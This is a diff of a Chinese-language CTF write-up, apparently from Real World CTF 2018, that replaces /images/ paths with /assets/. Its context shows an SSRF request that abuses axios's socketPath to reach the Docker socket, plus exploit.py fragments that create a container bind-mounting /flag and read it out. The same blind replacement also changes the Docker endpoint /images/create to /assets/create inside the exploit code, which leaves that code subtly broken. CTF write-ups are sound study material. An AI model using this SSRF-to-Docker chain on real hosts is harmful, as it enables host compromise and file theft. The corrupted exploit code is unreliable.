@@ -170,11 +170,11 @@ tags: ctf
 
    上边这一段代码由于`@login_required` 写在route上边，所以存在未授权访问。
 
-   ![](/images/realworldctf/TIM截图20180801194537.png)
+   ![](/assets/realworldctf/TIM截图20180801194537.png)
 
 5. 添加csrf_token
 
-   ![](/images/realworldctf/TIM截图20180801195906.png)
+   ![](/assets/realworldctf/TIM截图20180801195906.png)
 
 6. 漏洞
 
@@ -280,7 +280,7 @@ tags: ctf
 
     收到响应。
 
-    ![](/images/realworldctf/TIM截图20180802110118.png)
+    ![](/assets/realworldctf/TIM截图20180802110118.png)
 
 12. 修改payload，获取flag
 
@@ -517,13 +517,13 @@ tags: ctf
 
    **axios**这个东西是不支持**file://**协议的，但是通过文档可知，他支持**UNIX Socket** 。
 
-   ![](/images/realworldctf/TIM截图20180802194917.png)
+   ![](/assets/realworldctf/TIM截图20180802194917.png)
 
    测试`ping`。
 
    > GET http://54.183.55.10/print?url[url]=/_ping&url[socketPath]=/var/run/docker.sock&url=https://hackmd.io/ HTTP/1.1
 
-   ![](/images/realworldctf/TIM截图20180802195456.png)
+   ![](/assets/realworldctf/TIM截图20180802195456.png)
 
 5. exploit.py
 
@@ -565,7 +565,7 @@ tags: ctf
            string.ascii_letters + string.digits, 6))
        _us = [
            'url[url]=/_ping&',
-           'url[method]=post&url[url]=http://127.0.0.1/images/create?fromImage=alpine:latest',
+           'url[method]=post&url[url]=http://127.0.0.1/assets/create?fromImage=alpine:latest',
            'url[method]=post&url[url]=http://127.0.0.1/containers/create?name=%s&url[data][Image]=alpine:latest&url[data][Volumes][flag][path]=/getflag&url[data][Binds][]=/flag:/getflag:ro&url[data][Entrypoint][]=/bin/ls' % container_name,
            'url[method]=post&url[url]=http://127.0.0.1/containers/%s/start' % container_name,
            'url[method]=get&url[url]=http://127.0.0.1/containers/%s/archive?path=/getflag' % container_name
@@ -612,7 +612,7 @@ tags: ctf
    
        # Pull alpine image :)
        # --------------------
-       endpoint = urlencode("http://127.0.0.1/images/create?fromImage=alpine:latest")
+       endpoint = urlencode("http://127.0.0.1/assets/create?fromImage=alpine:latest")
        url = ('http://54.183.55.10/print'
               '?url[method]=POST'
               '&url[url]={}'
